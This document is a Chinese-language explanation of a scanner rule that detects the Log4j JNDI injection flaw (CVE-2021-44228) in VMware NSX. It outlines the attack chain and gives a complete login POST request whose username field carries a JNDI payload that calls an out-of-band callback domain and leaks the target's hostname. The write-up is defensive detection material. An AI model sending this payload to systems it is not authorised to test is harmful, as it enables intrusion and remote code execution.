# VMware NSX - Log4j JNDI RCE 漏洞（CVE-2021-44228）探测原理说明

## 1. 漏洞简介

VMware NSX 存在 Apache Log4j JNDI 注入远程代码执行漏洞（CVE-2021-44228）。攻击者可通过构造恶意请求，远程执行任意代码，危害系统安全。

## 2. 影响范围

- 受影响产品：VMware NSX（使用受影响 Log4j 版本）
- 只要日志、参数或配置中存在用户可控内容，均可能被利用

## 3. 漏洞原理

Log4j2 在处理日志消息时支持 JNDI 查找。攻击者可通过注入特殊payload，诱使 Log4j2 访问恶意JNDI服务器（如LDAP），加载并执行远程代码。

## 4. 利用方式与攻击流程

1. 攻击者搭建恶意LDAP服务器，返回恶意Java类。
2. 构造带有JNDI payload的HTTP请求，发送到NSX接口。
3. 日志记录参数时，Log4j2解析payload，触发JNDI查找，访问攻击者LDAP服务器。
4. 恶意Java类被加载并执行，实现RCE。

## 5. 探测原理与流程（yaml 规则详细说明）

该yaml规则利用OAST/DNSLog平台（如Interactsh）进行无害化探测，流程如下：

### 5.1 探测请求的构造

- 发送POST请求到如下接口：
  ```
  POST /login HTTP/1.1
  Host: <目标主机>
  Content-Type: application/x-www-form-urlencoded
  Origin: <BaseURL>
  Referer: <BaseURL>/login.jsp

  username=${jndi:ldap://${:-<rand1>}${:-<rand2>}.${hostName}.username.<interactsh-url>}&password=admin&submit=
  ```
  - <rand1>、<rand2>为随机数，<interactsh-url>为OAST平台生成的唯一域名。

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应头Location需包含`/login.jsp?login_error=1`，确认为NSX登录接口。
- **OAST平台交互**：
  - 若目标存在漏洞，Log4j2解析payload时会向OAST域名发起DNS查询，OAST平台记录该行为。

### 5.3 判定逻辑

- 只有当：
  1. HTTP响应头Location中包含`/login.jsp?login_error=1`，
  2. OAST平台收到带有对应随机标识的DNS查询，
  3. DNS查询格式与payload匹配，
  才判定目标存在Log4j JNDI RCE漏洞。

- **判定流程伪代码**：
  ```pseudo
  rand1, rand2 = 随机生成
  payload = '${jndi:ldap://${:-{rand1}}${:-{rand2}}.{hostName}.username.<oast-domain>}'
  发送POST /login，username字段为payload
  等待OAST平台回调
  若DNS查询中包含rand1, rand2, hostName，且响应头含login_error=1：
      判定目标存在漏洞
  ```

- **流程图**：
  ```mermaid
  graph TD
      A[发送带payload的POST请求到/login] --> B{响应头含login_error=1?}
      B -- 否 --> F[非目标, 终止]
      B -- 是 --> C[等待OAST平台DNS回显]
      C --> D{DNS查询中含随机标识?}
      D -- 否 --> F
      D -- 是 --> E[判定目标存在Log4j JNDI RCE漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [VMware NSX官方公告](https://kb.vmware.com/s/article/87086)
- [Log4j 官方安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [CVE-2021-44228 NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) 